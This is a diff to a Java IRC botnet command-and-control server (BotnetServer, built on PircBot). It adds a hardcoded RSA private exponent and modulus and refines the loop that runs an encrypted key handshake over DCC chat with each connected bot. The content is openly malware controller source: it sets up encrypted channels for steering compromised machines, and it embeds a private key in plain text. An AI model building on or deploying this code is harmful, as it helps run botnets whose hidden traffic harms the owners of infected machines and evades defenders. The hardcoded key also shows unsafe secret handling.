@@ -77,8 +77,11 @@ public class BotnetServer extends PircBot {
 	private boolean inChat;
 	private Map<String, MsgEncrypt> botKeys;
 	
-	private PubInfo info;
-		
+	private MsgEncrypt m;
+	
+	private String rsaPrivateExp = "5896038516564241556357979150106798326072983559174636640541170814807175093050001069635574568390661989844342672006609817750211828019578708203909259638414593";
+	private String rsaMod = "8406584928969230912194776015676041377044384281902059425892455383226755881066602094231727976096331374098875813287829766341473134627956293747440322615391837";
+
 	public static void main(String[] args) {
 		BotnetServer bn = new BotnetServer();
 	}
@@ -87,6 +90,8 @@ public class BotnetServer extends PircBot {
 	 * Constructs a new BotnetServer object that connects to the IRC channel and awaits commands from the user.
 	 */
 	public BotnetServer() {
+		m = MsgEncrypt.getInstance();
+		m.genRSAPrivateKey(rsaMod + " " + rsaPrivateExp);
 		input = new Scanner(System.in);
 		try {
 			botKeys = new HashMap<String, MsgEncrypt>();
@@ -116,8 +121,8 @@ public class BotnetServer extends PircBot {
 				System.out.print("\t" + bots[i].toString());
 				//TODO: fill in stuff with key stuff
 				PubInfo info = MsgEncrypt.getPubParams();
-				MsgEncrypt m = MsgEncrypt.getInstance();
-				m.setPubParams(info.toString());
+				MsgEncrypt m2 = MsgEncrypt.getInstance();
+				m2.setPubParams(info.toString());
 				try {
 					DccChat chat = dccSendChatRequest(bots[i].getNick(), TIMEOUT);
 					if (chat == null) {
@@ -126,13 +131,13 @@ public class BotnetServer extends PircBot {
 						chat.sendLine("key");
 						//use shellout for getting returned data from the client if you need it
 						//use chat.sendLine(s) to send key info
-						String key = m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::");
+						String key = m2.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::");
 						chat.sendLine(key); // send key
 						chat.sendLine(info.toString()); // send public info
 						String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n"); // get public key
 						//System.out.println("key: " + otherKey);
-						m.handShake(otherKey);
-						botKeys.put(bots[i].getNick(), m);
+						m2.handShake(otherKey);
+						botKeys.put(bots[i].getNick(), m2);
 						chat.close();
 					}
 					System.out.println(" (secure)");
